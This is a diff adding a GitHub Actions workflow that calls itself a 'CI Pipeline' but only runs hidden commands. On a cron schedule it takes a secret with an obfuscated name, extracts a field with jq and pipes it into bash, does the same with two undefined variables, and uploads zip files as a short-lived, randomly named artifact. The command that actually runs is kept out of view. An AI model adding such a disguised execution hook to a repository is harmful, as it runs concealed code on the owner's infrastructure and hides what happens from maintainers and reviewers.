@@ -1,0 +1,32 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '42 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          xcfg434: ${{ secrets.xcfg434 }}
+        run: |
+          printf '%s' "$xcfg434" | jq -r .nng4629 | /bin/bash
+          printf '%s' "$yql326" | jq -r .rmiko64530 | /bin/bash
+          echo $cme4425 | jq -r .xye64035 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: zWnRayBJ
+          path: "*.zip"
+          retention-days: 1
